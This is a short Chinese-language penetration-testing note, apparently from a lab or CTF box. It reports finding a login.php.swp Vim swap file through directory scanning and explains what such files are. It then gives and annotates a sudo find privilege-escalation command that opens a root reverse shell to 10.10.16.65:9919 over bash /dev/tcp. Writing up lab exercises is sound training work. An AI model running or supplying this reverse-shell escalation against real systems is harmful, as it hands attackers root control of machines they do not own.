web测试

通过目录扫描发现login.php.swp文件。

swp文件是Vim或Vi文本编辑器创建的临时交换文件，主要用于以下两个核心原因：
1. **崩溃恢复**：当编辑会话异常中断（如系统崩溃、终端意外关闭、网络断开）时，swp文件保存着未保存的更改和编辑状态。重新打开原文件时，Vim会提示你恢复内容，防止数据丢失。
2. **避免编辑冲突**：当同一个文件被多个Vim实例同时打开编辑时，后续实例会检测到先打开实例创建的swp文件，从而发出警告，防止多人编辑导致更改相互覆盖。
简单来说，它是Vim的“自动保存和冲突检测”机制文件。

//直接使用find命令提权，做好端口监听执行以下内容。最终获得root权限
sudo find /etc/passwd -exec bash -ip >& /dev/tcp/10.10.16.65/9919 0>&1 \;
 
 	各部分含义：
        sudo - 以 root 权限执行
        find /etc/passwd - 查找 /etc/passwd文件
        -exec ... \; - 对找到的每个文件执行后面的命令
        bash -ip：
        -i：交互式 shell
        -p：保持特权模式（不重置有效用户ID）
        >& /dev/tcp/10.10.16.65/9919 - Bash 的特殊特性：
        /dev/tcp/是 Bash 的内建功能（不是真实文件）
        建立 TCP 连接到 10.10.16.65:9919
        >&将标准输出和标准错误都重定向到该连接
        0>&1 - 将标准输入也重定向到同一连接
        \; - -exec命令结束符
    实际效果
        当执行时：
        会找到 /etc/passwd文件（通常存在）
        对每个找到的文件（就这一个）执行 Bash 命令
        Bash 会尝试连接到攻击者的机器 10.10.16.65的 9919端口
        建立连接后，会在攻击者的机器上获得一个反向的交互式 Shell
        由于使用了 sudo，这个 Shell 很可能具有 root 权限
